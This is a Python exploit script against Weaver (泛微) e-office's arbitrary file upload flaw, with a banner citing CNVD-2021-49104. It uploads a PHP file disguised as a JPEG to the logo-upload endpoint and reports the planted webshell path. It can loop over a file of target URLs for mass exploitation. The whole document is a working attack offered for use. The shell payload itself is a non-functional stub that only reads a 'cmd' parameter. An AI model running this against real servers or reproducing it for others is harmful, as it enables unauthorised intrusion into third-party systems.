import argparse
import base64
import subprocess
import requests


def Args():
    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter,description='''
泛微 e-office upload any file!
    ''')
    parser.add_argument('-u','--url',help="please input URL")
    parser.add_argument('-f','--file',help="please input URL file")
    args = parser.parse_args()
    if args.file is None and args.url is None:
        print(parser.print_help())
        exit()
    else:
        return args

def attack(url):
    print("[+]trying attack")
    if url[-1:] == '/':
        url = url[:-1]
    else:
        url = url
    realurl = url + '/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo'
    files = {
        "Filedata":("joker.php",'''<?php $_REQUEST['cmd'];?>''',"image/jpeg")
    }
    shellpath = '/images/logo/logo-eoffice.php'
    try:
        res = requests.post(url=realurl,files=files)
        if 'logo-eoffice.php' in res.text:
            print("[+]upload success！shellpath：" + url + shellpath)
        else:
            print("[+]vuln is not exists")
    except Exception as e:
        print("[+]vuln is not exists")


def readfile(urlpath):
    list = []
    with open(urlpath,"r") as f:
        line = f.readlines()
    for i in line:
        if '/' == i.strip()[:-1]:
            i = i.strip()
        else:
            i = i.strip()+'/'
        list.append(i)
    return list
def main():
    img = """
 _____ _   ___      _______       ___   ___ ___  __        _  _   ___  __  ___  _  _   
 / ____| \ | \ \    / /  __ \     |__ \ / _ \__ \/_ |      | || | / _ \/_ |/ _ \| || |  
| |    |  \| |\ \  / /| |  | |______ ) | | | | ) || |______| || || (_) || | | | | || |_ 
| |    | . ` | \ \/ / | |  | |______/ /| | | |/ / | |______|__   _\__, || | | | |__   _|
| |____| |\  |  \  /  | |__| |     / /_| |_| / /_ | |         | |   / / | | |_| |  | |  
 \_____|_| \_|   \/   |_____/     |____|\___/____||_|         |_|  /_/  |_|\___/   |_|  

    """
    print(img)
    args = Args()
    if args.file is None and args.url is not None:
        attack(args.url)
    else:
        urllist = readfile(args.file)
        for i in urllist:
            attack(i)
if __name__ =="__main__":
    main()

